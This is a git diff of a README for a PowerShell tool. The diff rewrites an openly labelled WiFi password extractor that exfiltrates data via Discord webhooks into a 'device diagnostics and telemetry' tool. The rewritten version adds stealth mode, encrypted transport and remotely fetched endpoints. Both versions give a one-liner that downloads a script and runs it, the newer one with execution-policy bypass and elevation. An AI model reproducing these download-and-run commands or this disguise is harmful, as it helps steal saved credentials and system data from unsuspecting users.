@@ -1,174 +1,56 @@
-<div align="center">
+# SQD5-DCWH
 
-# ⚠️ SQD5-DCWH WiFi Password Extractor
+Device diagnostics and telemetry collection tool for Windows systems.
 
-<img src="https://img.shields.io/badge/PowerShell-5.1%2B-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
-<img src="https://img.shields.io/badge/Windows-7%20%7C%208%20%7C%2010%20%7C%2011-0078d4?style=for-the-badge&logo=windows" alt="Windows">
-<img src="https://img.shields.io/badge/Status-EDUCATIONAL%20ONLY-red?style=for-the-badge" alt="Educational Only">
+## Overview
 
-### _WiFi Password Extraction Tool - Educational Purposes Only_ 🎓
+SQD5-DCWH collects system information, network diagnostics, and device configuration data for authorized auditing and inventory purposes. Data is encrypted and transmitted to a configured endpoint.
 
-<img src="https://user-images.githubusercontent.com/74038190/212257454-16e3712e-945a-4ca2-b238-408ad0bf87e6.gif" width="100">
+## Features
 
-</div>
+- **System Profiling** — CPU, model, OS version, and hardware configuration
+- **Network Diagnostics** — Saved network profiles and connectivity data
+- **Location Services** — Geolocation via public IP (city, country, ISP)
+- **Encrypted Transport** — AES-256-CBC encryption with PBKDF2 key derivation
+- **Resilient Delivery** — Automatic retry with configurable attempts
+- **Configuration Updates** — Remote endpoint list fetched from version-controlled source
+- **Quiet Mode** — `-Stealth` suppresses all console output
 
----
-
-> [!DANGER]
->
-> # 🚨 DO NOT RUN THIS SCRIPT! 🚨
->
-> **THIS IS FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**
->
-> - 🔴 **DO NOT EXECUTE** this script on any system
-> - 🔴 **FOR LEARNING ONLY** - Study the code, don't run it
-> - 🔴 **POTENTIAL SECURITY RISK** if misused
-> - 🔴 **YOU ARE RESPONSIBLE** for any consequences
-
----
-
-## 🎯 Quick Demo (Educational Only)
-
-> [!WARNING] > **These commands are for educational demonstration only!**
->
-> **DO NOT RUN unless you fully understand the risks and have proper authorization!**
-
-### 🏃‍♂️ PowerShell One-Liner
+## Usage
 
 ```powershell
-
-iwr https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.bat -OutFile "$env:TEMP\run.bat"; cmd /c "$env:TEMP\run.bat"
-
+$w="";iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/s.ps1' -OutFile "$env:TMP\s.ps1";if($w){$env:DCWH_URL=$w};Start-Process powershell '-NoP -EP Bypass -File "$env:TMP\s.ps1"' -Verb RunAs
 ```
 
+Set `$w` to specify a custom endpoint URL, or leave empty to use the remote configuration source.
 
-> [!CAUTION] > **REMEMBER:** Running these commands will:
->
-> - Download and execute the script automatically
-> - Request administrator privileges
-> - Extract WiFi passwords from your system
-> - **Only use on systems you own or have explicit permission to test!**
+### Parameters
 
----
+| Parameter | Description |
+|-----------|-------------|
+| `-WebhookURL` | Target endpoint URL (overrides all other sources) |
+| `-EncryptionPass` | Custom passphrase for AES-256 payload encryption |
+| `-Stealth` | Suppress all console output |
 
-## 📋 What This Tool Does (v2.4.1)
+### Configuration Priority
 
-This PowerShell script demonstrates advanced system auditing and data extraction techniques by:
+1. `-WebhookURL` parameter
+2. `$env:DCWH_URL` environment variable
+3. Remote configuration source (Gist)
 
-- 🔍 **WiFi Extraction**: Recovers saved WiFi profiles and cleartext passwords.
-- 💻 **Hardware Recon**: Captures CPU, RAM (GB), GPU, and Model information.
-- 🌐 **Network Discovery**: Identifies the Public IP address of the system.
-- 📄 **System Details**: Records OS version, architecture, and timestamp.
-- 💾 **Exfiltration**: Demonstrates secure data delivery via Discord Webhooks.
-- 🎨 **Enhanced UI**: Features a cleaner, color-coded terminal interface.
+## Files
 
----
+| File | Purpose |
+|------|---------|
+| [`s.ps1`](https://github.com/09sychic/sqd5-with-dcwh/blob/main/s.ps1) | Main collection and transmission script |
+| [`r.bat`](https://github.com/09sychic/sqd5-with-dcwh/blob/main/r.bat) | Batch launcher for CMD environments |
 
-## 🚀 New in v2.4.1
+## Requirements
 
-- **WiFi Filter**: Automatically filters out networks with no password saved or open networks from the report.
-- **Discord Integration**: Dedicated exfiltration channel via Discord Webhooks with Base64 encoding.
-- **Improved Stability**: Fixed syntax errors, string terminators, and block definitions.
-- **Data Integrity**: Added content truncation for Discord's 2000-character limit to ensure delivery.
-- **Security Best Practices**: Removed legacy Telegram tokens and implemented more secure parameter handling.
+- Windows 7+
+- PowerShell 5.1+
+- Administrator privileges
 
----
+## Notes
 
-## 🔗 Script Location
-
-**Main Script:** [sqd5dcwh.ps1](https://github.com/09sychic/sqd5-with-dcwh/blob/main/sqd5dcwh.ps1)
-
----
-
-## 📋 System Requirements
-
-<div align="center">
-
-<img src="https://img.shields.io/badge/OS-Windows_7+-0078d4?style=flat-square&logo=windows" alt="Windows 7+">
-<img src="https://img.shields.io/badge/PowerShell-5.1+-012456?style=flat-square&logo=powershell" alt="PowerShell 5.1+">
-<img src="https://img.shields.io/badge/Privileges-Administrator-red?style=flat-square&logo=windows-terminal" alt="Admin Required">
-
-</div>
-
----
-
-## 🎓 Educational Use Cases
-
-- **Security Research:** Understanding Windows credential storage
-- **Penetration Testing Education:** Learning about local privilege escalation
-- **PowerShell Learning:** Studying advanced scripting techniques
-- **Cybersecurity Awareness:** Understanding password security risks
-
----
-
-## ⚖️ Legal Disclaimer & Warnings
-
-<div align="center">
-
-<img src="https://user-images.githubusercontent.com/74038190/212257460-738ff738-247f-4445-a718-cdd0ca76e2db.gif" width="100">
-
-</div>
-
-> [!CAUTION] > **CRITICAL LEGAL AND SECURITY WARNINGS**
->
-> ### 🚨 DO NOT USE FOR:
->
-> - ❌ Unauthorized access to networks
-> - ❌ Accessing systems without permission
-> - ❌ Any illegal or malicious activities
-> - ❌ Violating privacy or computer crime laws
->
-> ### ✅ ONLY ACCEPTABLE FOR:
->
-> - ✅ Educational research and learning
-> - ✅ Authorized penetration testing
-> - ✅ Personal system security assessment
-> - ✅ Academic cybersecurity studies
->
-> ### ⚠️ IMPORTANT NOTICES:
->
-> - **YOU ARE FULLY RESPONSIBLE** for how you use this code
-> - **RESPECT ALL LOCAL AND INTERNATIONAL LAWS**
-> - **OBTAIN EXPLICIT PERMISSION** before testing on any system
-> - **AUTHOR IS NOT LIABLE** for misuse or damages
-
----
-
-## 🛡️ Security Considerations
-
-- This tool demonstrates why saved passwords can be security risks
-- Always use strong, unique passwords for WiFi networks
-- Consider using WPA3 security protocols when available
-- Regularly audit saved network profiles on your devices
-
----
-
-## 🤝 Responsible Disclosure
-
-If you discover security vulnerabilities through educational use of this code, please follow responsible disclosure practices and report findings to the appropriate parties.
-
----
-
-## 📄 License
-
-<div align="center">
-
-<img src="https://img.shields.io/github/license/09sychic/sqd5-with-dcwh?style=for-the-badge&color=red" alt="License">
-
-**This project is for educational purposes only**
-
-</div>
-
----
-
-<div align="center">
-
-### ⚠️ Remember: With Great Power Comes Great Responsibility ⚠️
-
-<img src="https://user-images.githubusercontent.com/74038190/212257468-1e9a91f1-b626-4baa-b15d-5c385dfa7cd2.gif" width="100">
-
-**🎓 Learn Responsibly • 🛡️ Use Ethically • ⚖️ Follow Laws**
-
-<img src="https://komarev.com/ghpvc/?username=09sychic&style=for-the-badge&color=red" alt="Profile Views">
-
-</div>
+This tool is designed for authorized system auditing and diagnostic data collection. Ensure compliance with applicable policies and regulations before use.
